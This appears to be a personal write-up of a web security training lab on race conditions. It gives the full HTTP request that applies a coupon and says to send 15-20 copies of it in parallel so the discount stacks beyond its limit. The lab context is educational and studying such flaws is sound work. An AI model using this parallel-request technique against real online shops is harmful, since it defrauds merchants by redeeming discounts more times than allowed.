# 1. Limit overrun race conditions

**Goal** : apply a single coupon code multiple times.

**Steps** :

- 1st login as a wiener, then have to buy a **Lightweight L33t Leather Jacket**
    - but u do not have much money to buy, so after apply coupon code, still shortage of money.
    - so we remove the coupon code and we have a endpoint of coupon code.
    
    ```php
    POST /cart/coupon HTTP/2
    Host: 0a1200eb04fcb86a8b3c3e2000e700c9.web-security-academy.net
    Cookie: session=6lkjUnsCrKjjezTl0axxWdBLhHJFWBQ2
    Content-Length: 52
    Cache-Control: max-age=0
    Sec-Ch-Ua: "Not(A:Brand";v="8", "Chromium";v="144", "Google Chrome";v="144"
    Sec-Ch-Ua-Mobile: ?0
    Sec-Ch-Ua-Platform: "Linux"
    Origin: https://0a1200eb04fcb86a8b3c3e2000e700c9.web-security-academy.net
    Content-Type: application/x-www-form-urlencoded
    Upgrade-Insecure-Requests: 1
    User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/144.0.0.0 Safari/537.36
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Sec-Fetch-Site: same-origin
    Sec-Fetch-Mode: navigate
    Sec-Fetch-User: ?1
    Sec-Fetch-Dest: document
    Referer: https://0a1200eb04fcb86a8b3c3e2000e700c9.web-security-academy.net/cart
    Accept-Encoding: gzip, deflate, br
    Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
    Priority: u=0, i
    
    csrf=xstbbRJ6MnlKPOY8NTBWCFhT1O7dHPyk&coupon=PROMO20
    ```
    
- send it to repeater, and make 15-20 copies and combine in a single group. and send again parallel attack. hurrey now can buy the tshirt.

LAB SOLVED 😉